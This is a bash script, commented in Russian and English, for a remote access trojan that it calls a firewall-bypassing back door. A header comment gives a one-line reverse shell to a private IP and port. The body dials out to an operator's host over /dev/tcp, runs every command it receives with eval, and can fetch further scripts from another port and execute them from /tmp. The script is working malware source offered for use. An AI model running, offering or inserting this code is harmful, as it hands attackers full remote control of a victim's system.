#!/bin/bash -

# Shebang

# Back door bypass the firewall
# /bin/bash -i < /dev/tcp/192.168.10.5/8080 1>&0 2>&0 
#  
# RemoteRat.sh  hostname port1 [port2 [port3]]

function cleanup ()
{
    rm -f $TMPFL
}

function runScript ()
{
    
    echo "$1" > /dev/tcp/${BACKHOST}/${BACKPORT2}   # Передаю нужный сценарий  
                                                    # Остановка 
    sleep 1                                         # Увеличиваю время ожидания ответа передачи данных
    if [[ $1 == 'exit' ]] ; then exit ; fi
    cat > $TMPFL </dev/tcp/${BACKHOST}/${BACKPORT3} # Сохраняю вывод в файле. Если соединения на другом 
                                                    # конце установлено перенаправляем в stdin, содержимое
                                                    # сценария становится доступным.
    bash $TMPFL                                     # Выполняем с помощью bash
}

 
BACKHOST=$1
BACKPORT=$2
BACKPORT2=${3:-$((BACKPORT+1))}
BACKPORT3=${4:-$((BACKPORT2+1))}

TMPFL="/tmp/$$.sh"
trap cleanup EXIT

# звоним домой
exec  </dev/tcp/${BACKHOST}/${BACKPORT} 1>&0 2>&0    
while true
do
    echo -n '$ '                                      
    read -r                         # считываю обратный слэш как обычный символ                        
    if [[ ${REPLY:0:1} == '!' ]]    # Интепретирую bash                  
    then
	# it's a script
        FN=${REPLY:1}               # Подстрока начинается от индекса 1 и до конца строки                
	runScript $FN
    else
	# normal case - run the cmd
	eval "$REPLY"                   # Клиент отправит строку через TCP сокет, считывающий этот сценарий 
                                    # запускаю eval, для считывания команд.             
    fi
done
